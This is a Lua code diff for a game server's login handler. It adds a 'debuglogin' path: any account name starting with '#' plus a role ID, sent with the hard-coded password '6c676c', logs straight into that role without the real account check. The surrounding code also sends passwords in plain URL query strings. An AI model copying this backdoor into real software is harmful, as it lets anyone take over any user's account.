@@ -26,11 +26,41 @@ function REQUEST.register(obj,request)
 	end
 end
 
+local function debuglogin(obj,request)
+	local account = request.account
+	local passwd = request.passwd
+	if account:sub(1,1) == "#" then
+		local pid = tonumber(account:sub(2,-1))
+		if passwd == "6c676c" then
+			local resume = resumemgr.getresume(pid)
+			if not resume then
+				return STATUS_ROLE_NOEXIST
+			else
+				obj.passlogin = true
+				return STATUS_OK,{
+					{
+						roleid = pid,
+						name = resume.name,
+						lv = resume.lv,
+						roletype = resume.roletype,
+					}
+				}
+			end
+		end
+		return STATUS_PASSWD_NOMATCH
+	end
+	return false
+end
+
 function REQUEST.login(obj,request)
 	local account = assert(request.account)
 	local passwd = assert(request.passwd)
 	obj.account = account
 	obj.passwd = passwd
+	local result,roles = debuglogin(obj,request)	
+	if result then
+		return {result=result,roles=roles}
+	end
 	local url = string.format("/login?acct=%s&passwd=%s",account,passwd)
 	local status,body = httpc.get(cserver.accountcenter.host,url)
 	if status == 200 then
